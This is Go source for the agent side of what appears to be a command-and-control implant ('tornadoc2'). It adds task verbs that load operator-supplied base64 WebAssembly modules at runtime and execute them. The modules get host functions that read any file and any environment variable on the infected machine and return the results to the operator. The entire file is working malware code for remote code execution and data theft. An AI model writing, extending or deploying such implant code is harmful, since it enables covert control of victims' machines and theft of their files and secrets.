package core

import (
	"context"
	crand "crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"io"
	"os"
	"strings"
	"sync"

	"github.com/tetratelabs/wazero"
	"github.com/tetratelabs/wazero/api"

	"tornadoc2/agent/protocol"
)

var (
	extMu      sync.Mutex
	extRuntime wazero.Runtime
	extInitErr error
	extModules = map[string]api.Module{}
	extOut  []byte
	extArgs []string
)

func extInit() {
	if extRuntime != nil || extInitErr != nil {
		return
	}
	extRuntime = wazero.NewRuntimeWithConfig(context.Background(),
		wazero.NewRuntimeConfigInterpreter().
			// 256 pages × 64 KiB/page = 16 MiB ceiling.
			WithMemoryLimitPages(256))

	_, err := extRuntime.NewHostModuleBuilder("env").
		NewFunctionBuilder().WithFunc(extHostOut).Export("host_out").
		NewFunctionBuilder().WithFunc(extHostRead).Export("host_read").
		NewFunctionBuilder().WithFunc(extHostEnv).Export("host_env").
		NewFunctionBuilder().WithFunc(extHostArgs).Export("host_args").
		Instantiate(context.Background())
	if err != nil {
		extInitErr = err
	}
}

func extHostOut(_ context.Context, m api.Module, ptr, ln uint32) {
	if data, ok := m.Memory().Read(ptr, ln); ok {
		extOut = append(extOut, data...)
	}
}

// host_read(path_ptr, path_len, buf_ptr, buf_cap) -> u32 bytes_written
func extHostRead(_ context.Context, m api.Module,
	pathPtr, pathLen, bufPtr, bufCap uint32) uint32 {

	path, ok := m.Memory().Read(pathPtr, pathLen)
	if !ok {
		return 0
	}
	if bufCap == 0 {
		return 0
	}

	f, err := os.Open(string(path))
	if err != nil {
		return 0
	}
	defer f.Close()

	buf := make([]byte, bufCap)
	n, err := io.ReadFull(f, buf)
	if err != nil && err != io.EOF && err != io.ErrUnexpectedEOF {
		return 0
	}
	if !m.Memory().Write(bufPtr, buf[:n]) {
		return 0
	}
	return uint32(n)
}

// host_env(name_ptr, name_len, buf_ptr, buf_cap) -> u32 bytes_written
func extHostEnv(_ context.Context, m api.Module,
	namePtr, nameLen, bufPtr, bufCap uint32) uint32 {

	name, ok := m.Memory().Read(namePtr, nameLen)
	if !ok {
		return 0
	}
	val := os.Getenv(string(name))
	if uint32(len(val)) > bufCap {
		val = val[:bufCap]
	}
	if !m.Memory().Write(bufPtr, []byte(val)) {
		return 0
	}
	return uint32(len(val))
}

// host_args(buf_ptr, buf_cap) -> u32 bytes_written
// Arguments are exposed as a NUL-separated string.
func extHostArgs(_ context.Context, m api.Module,
	bufPtr, bufCap uint32) uint32 {

	joined := strings.Join(extArgs, "\x00")
	if uint32(len(joined)) > bufCap {
		joined = joined[:bufCap]
	}
	if !m.Memory().Write(bufPtr, []byte(joined)) {
		return 0
	}
	return uint32(len(joined))
}

func (a *Agent) extensionRegister(t protocol.Task) protocol.Result {
	if len(t.Args) < 2 {
		return Result{ID: t.ID,
			Error: "extension_register requires <name> <b64_wasm>"}
	}
	name := t.Args[0]
	if name == "" || len(name) > 64 {
		return Result{ID: t.ID,
			Error: "extension name must be 1-64 characters"}
	}
	for _, r := range name {
		if !(r == '_' || r == '-' || r == '.' ||
			(r >= 'a' && r <= 'z') ||
			(r >= 'A' && r <= 'Z') ||
			(r >= '0' && r <= '9')) {
			return Result{ID: t.ID,
				Error: "extension name may contain only " +
					"letters, digits, '_', '-', '.'"}
		}
	}

	raw, err := base64.StdEncoding.DecodeString(t.Args[1])
	if err != nil {
		return Result{ID: t.ID, Error: "base64: " + err.Error()}
	}

	extMu.Lock()
	defer extMu.Unlock()

	extInit()
	if extInitErr != nil {
		return Result{ID: t.ID,
			Error: "extension host init failed: " + extInitErr.Error()}
	}

	var tmp [8]byte
	if _, rerr := crand.Read(tmp[:]); rerr != nil {
		return Result{ID: t.ID,
			Error: "entropy: " + rerr.Error()}
	}
	tempName := name + "_" + hex.EncodeToString(tmp[:])

	mod, err := extRuntime.InstantiateWithConfig(
		context.Background(), raw,
		wazero.NewModuleConfig().WithName(tempName))
	if err != nil {
		return Result{ID: t.ID, Error: "instantiate: " + err.Error()}
	}

	if old, ok := extModules[name]; ok {
		_ = old.Close(context.Background())
	}
	extModules[name] = mod
	return Result{ID: t.ID,
		Output: encodeOutput([]byte("loaded " + name + "\n"))}
}

func (a *Agent) extensionCall(ctx context.Context, t protocol.Task) protocol.Result {
	if len(t.Args) < 1 {
		return Result{ID: t.ID, Error: "extension_call requires <name>"}
	}
	name := t.Args[0]

	extMu.Lock()
	defer extMu.Unlock()

	extInit()
	if extInitErr != nil {
		return Result{ID: t.ID,
			Error: "extension host init failed: " + extInitErr.Error()}
	}

	mod, ok := extModules[name]
	if !ok {
		return Result{ID: t.ID, Error: "not loaded: " + name}
	}

	fn := mod.ExportedFunction("run")
	if fn == nil {
		return Result{ID: t.ID, Error: "module does not export `run`"}
	}

	const extOutRetain = 1 << 20
	if cap(extOut) > extOutRetain {
		extOut = nil
	} else {
		extOut = extOut[:0]
	}
	extArgs = t.Args[1:]

	code, err := fn.Call(ctx)
	if err != nil {
		return Result{ID: t.ID, Error: "call: " + err.Error()}
	}

	out := append([]byte(nil), extOut...)
	r := Result{ID: t.ID, Output: encodeOutput(out)}
	if len(code) > 0 {
		// wazero returns i32 as uint64. Interpret as signed so a
		// WASM module returning -1 surfaces as exit_code -1 on
		// the wire, not as 4294967295.
		r.ExitCode = int(int32(uint32(code[0])))
	}
	return r
}

func (a *Agent) extensionList(t protocol.Task) protocol.Result {
	extMu.Lock()
	defer extMu.Unlock()
	names := make([]string, 0, len(extModules))
	for n := range extModules {
		names = append(names, n)
	}
	out, _ := json.Marshal(names)
	return Result{ID: t.ID, Output: encodeOutput(out)}
}

func (a *Agent) extensionUnload(t protocol.Task) protocol.Result {
	if len(t.Args) < 1 {
		return Result{ID: t.ID, Error: "extension_unload requires <name>"}
	}
	name := t.Args[0]

	extMu.Lock()
	defer extMu.Unlock()

	mod, ok := extModules[name]
	if !ok {
		return Result{ID: t.ID,
			Output: encodeOutput([]byte("not loaded: " + name + "\n"))}
	}
	if err := mod.Close(context.Background()); err != nil {
		return Result{ID: t.ID,
			Error: "close: " + err.Error()}
	}
	delete(extModules, name)
	return Result{ID: t.ID,
		Output: encodeOutput([]byte("unloaded " + name + "\n"))}
}

func isExtensionVerb(verb string) bool {
	switch verb {
	case "extension_register", "extension_call",
		"extension_list", "extension_unload":
		return true
	}
	return false
}